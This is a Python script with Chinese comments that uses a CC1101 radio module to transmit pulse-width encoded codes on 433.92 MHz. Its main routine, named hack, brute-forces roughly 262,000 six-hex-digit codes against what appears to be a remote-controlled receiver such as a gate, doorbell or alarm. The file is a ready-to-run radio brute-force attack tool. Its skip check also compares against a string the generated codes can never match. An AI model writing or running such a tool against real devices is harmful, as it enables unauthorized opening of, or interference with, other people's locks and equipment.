import sys
import cc1101
import logging
import time

def getTxData(data, bit_rate=10000, isdebug=False):
    BIT_RATE = bit_rate
    BIT_DURATION_US = 1_000_000 / BIT_RATE

    HIGH_0_BITS = int(400 / BIT_DURATION_US)
    LOW_0_BITS = int(1100 / BIT_DURATION_US)
    HIGH_1_BITS = int(1100 / BIT_DURATION_US)
    LOW_1_BITS = int(400 / BIT_DURATION_US)

    if isdebug:
        print(f"BIT_RATE: {BIT_RATE} bps")
        print(f"BIT_DURATION_US: {BIT_DURATION_US} us")
        print(f"HIGH_0_BITS: {HIGH_0_BITS}, LOW_0_BITS: {LOW_0_BITS}")
        print(f"HIGH_1_BITS: {HIGH_1_BITS}, LOW_1_BITS: {LOW_1_BITS}")

    bit_stream = []

    for byte in data:
        for bit_pos in range(7, -1, -1):
            bit = (byte >> bit_pos) & 0x01
            if bit == 0:
                bit_stream += [1] * HIGH_0_BITS + [0] * LOW_0_BITS
            else:
                bit_stream += [1] * HIGH_1_BITS + [0] * LOW_1_BITS

    bit_stream += [1] * HIGH_0_BITS + [0] * LOW_0_BITS
    while len(bit_stream) % 8 != 0:
        bit_stream.append(0)
    bit_stream += [0] * 8

    if isdebug:
        print(f"Bit stream length: {len(bit_stream)} bits")

    tx_bytes = bytearray()
    for i in range(0, len(bit_stream), 8):
        byte = 0
        bits = bit_stream[i:i+8]
        for bit in bits:
            byte = (byte << 1) | bit
        if len(bits) < 8:
            byte <<= (8 - len(bits))
        tx_bytes.append(byte)

    return tx_bytes

def wait_for_idle(transceiver, timeout=2.0):
    start_time = time.time()
    while True:
        state = transceiver.get_main_radio_control_state_machine_state()
        if state == cc1101.MainRadioControlStateMachineState.IDLE:
            return
        if time.time() - start_time > timeout:
            raise TimeoutError("等待芯片状态变为IDLE超时")
        time.sleep(0.01)

def init_transceiver(frequency=433.92e6, symbol_rate=10122, power=(0, 0xC0)):
    transceiver = cc1101.CC1101()
    transceiver.__enter__()
    transceiver.set_base_frequency_hertz(frequency)
    transceiver.set_symbol_rate_baud(symbol_rate)
    transceiver.set_sync_mode(cc1101.SyncMode.NO_PREAMBLE_AND_SYNC_WORD)
    transceiver.set_packet_length_mode(cc1101.PacketLengthMode.FIXED)
    transceiver.disable_checksum()
    transceiver.set_output_power(power)
    logging.info(f"Transceiver initialized:\n{transceiver}")
    return transceiver

# 加入重试机制的发送函数
def send_data(transceiver, tx_bytes, max_retries=3, retry_interval=0.1):
    for attempt in range(1, max_retries + 1):
        try:
            wait_for_idle(transceiver)
            transceiver.set_packet_length_bytes(len(tx_bytes))
            transceiver.transmit(tx_bytes)
            # logging.info("Data transmitted successfully.")
            return  # 成功发送后直接返回
        except Exception as e:
            logging.warning(f"发送数据失败，第{attempt}次尝试，错误信息: {e}")
            if attempt < max_retries:
                time.sleep(retry_interval)
            else:
                logging.error("重试3次后仍然失败，即将关闭transceiver。")
                close_transceiver(transceiver)
                raise e  # 抛出异常终止程序

def close_transceiver(transceiver):
    transceiver.__exit__(None, None, None)
    logging.info("Transceiver closed.")

def test(transceiver):
    hex_string = '4bb108'
    data = bytes.fromhex(hex_string)
    tx_data = getTxData(data, isdebug=False)

    for _ in range(3):
        send_data(transceiver, tx_data)

def hack(transceiver):
    start = 0x00000
    end = 0x40000
    for i in range(start, end):
        hex_string = f"{i:05x}" + "1"
        if hex_string == '4bb10801':
            continue
        data = bytes.fromhex(hex_string)
        tx_data = getTxData(data, isdebug=False)
        print(f"Sending: {hex_string}")

        for _ in range(2):
            send_data(transceiver, tx_data)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    logging.getLogger("cc1101").setLevel(logging.WARNING)

    transceiver = init_transceiver(frequency=433.92e6, symbol_rate=10122, power=(0, 0xC0))

    try:
        # test(transceiver)
        hack(transceiver)
    finally:
        close_transceiver(transceiver)
